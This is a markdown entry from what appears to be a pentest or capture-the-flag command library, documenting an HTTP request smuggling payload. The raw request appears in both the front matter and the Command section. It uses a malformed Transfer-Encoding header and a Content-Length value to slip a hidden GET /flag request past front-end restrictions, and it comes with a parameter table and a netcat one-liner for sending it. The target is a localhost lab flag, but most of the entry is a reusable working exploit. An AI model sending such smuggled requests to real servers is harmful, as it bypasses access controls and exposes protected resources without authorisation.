---
data: |+
  POST / HTTP/1.1
  Host: 127.0.0.1
  Transfer-Encoding: AAA chunked BBB
  Connection: keep-alive
  Content-Length: 50

  71
  A
  0

  GET /flag HTTP/1.1
  Host: 127.0.0.1

tags:
  - http
  - smuggling
  - exploit
type: command
executor: http
platforms:
  - Web
id: 5f895125-021b-4af6-84c8-774d25ccfbf1
created_at: '2025-12-13T09:01:22.203Z'
updated_at: '2025-12-13T09:01:22.203Z'
verified: false
validated: true
submitted: true
---
# HTTP Smuggling Request

## Command

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: AAA chunked BBB
Connection: keep-alive
Content-Length: 50

71
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1

```

## Description

Crafts an HTTP request for CL-TE smuggling, exploiting loose parsing to bypass restrictions and access /flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Transfer-Encoding` | Malformed value like 'AAA chunked BBB' | Yes |
| `Content-Length` | Length for smuggling (e.g., 50) | Yes |

## Examples

### Basic Usage

Send via netcat: nc 127.0.0.1 80 < request.txt

### Advanced Usage

Modify the smuggled request as needed.

## Expected Output

Response from smuggled GET /flag, e.g., 'flag is 123456'.

## Related

- [[procedures/Exploit-HTTP-Request-Smuggling]]
- [[tools/WEBrick]]
